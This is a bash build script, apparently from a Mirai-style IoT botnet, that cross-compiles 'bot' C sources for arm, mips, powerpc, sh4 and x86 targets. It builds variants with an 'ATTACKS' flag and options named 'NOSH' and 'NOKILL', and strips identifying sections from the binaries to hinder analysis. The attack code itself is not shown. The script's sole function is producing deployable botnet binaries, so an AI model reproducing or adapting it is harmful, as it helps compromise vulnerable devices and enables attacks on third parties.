#!/bin/bash

# Add cross-compiler paths
CROSS_COMPILERS=(
    "/etc/xcompile/arc/bin"
    "/etc/xcompile/armv4l/bin"
    "/etc/xcompile/armv5l/bin"
    "/etc/xcompile/armv6l/bin"
    "/etc/xcompile/armv7l/bin"
    "/etc/xcompile/i586/bin"
    "/etc/xcompile/m68k/bin"
    "/etc/xcompile/mips/bin"
    "/etc/xcompile/mipsel/bin"
    "/etc/xcompile/powerpc/bin"
    "/etc/xcompile/sh4/bin"
    "/etc/xcompile/sparc/bin"
)

for path in "${CROSS_COMPILERS[@]}"; do
    export PATH=$PATH:$path
done

# Standard strip flags
COMMON_STRIP="--strip-unneeded --remove-section=.note.gnu.gold-version \
--remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id \
--remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt \
--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"

# Compile function
compile_bot() {
    local arch=$1
    local output=$2
    local strip_flags=$3
    local compile_flags=$4
    mkdir -p bins
    "$arch-gcc" -std=c99 bot/*.c -o bins/"$output" $compile_flags -lpthread -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections
    "$arch-strip" bins/"$output" $strip_flags
    echo -e "\033[37mFinished compiling \033[96m[$output]\033[0m"
}

# Special compile function for armv7
compile_bot7() {
    local arch=$1
    local output=$2
    local compile_flags=$3
    mkdir -p bins
    "$arch-gcc" -std=c99 bot/*.c -o bins/"$output" $compile_flags -lpthread -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections
    "$arch-strip" bins/"$output" --strip-unneeded --strip-all
    echo -e "\033[37mFinished compiling \033[96m[$output]\033[0m"
}

# Define architectures and output names
ARCHS=("i586" "armv4l" "armv5l" "armv6l" "armv7l" "mips" "mipsel" "powerpc" "sh4")
OUTPUTS=(
    "x86" "arm" "arm5" "arm6" "arm7" "mips" "mpsl" "ppc" "sh4"
)

# Define variants and compile flags
VARIANTS=(
    "-DATTACKS"
    "-DATTACKS -DNOSH"
    "-DATTACKS -DNOSH -DNOKILL"
)
VARIANT_SUFFIX=(
    "" "nsh" "nshk"
)

# Loop through architectures and variants
for i in "${!ARCHS[@]}"; do
    arch=${ARCHS[$i]}
    base_output=${OUTPUTS[$i]}

    for j in "${!VARIANTS[@]}"; do
        variant=${VARIANTS[$j]}
        suffix=${VARIANT_SUFFIX[$j]}
        output_name="${suffix}${base_output}"

        if [ "$arch" == "armv7l" ]; then
            compile_bot7 "$arch" "$output_name" "-static $variant"
        else
            compile_bot "$arch" "$output_name" "$COMMON_STRIP" "-static $variant"
        fi
    done
done
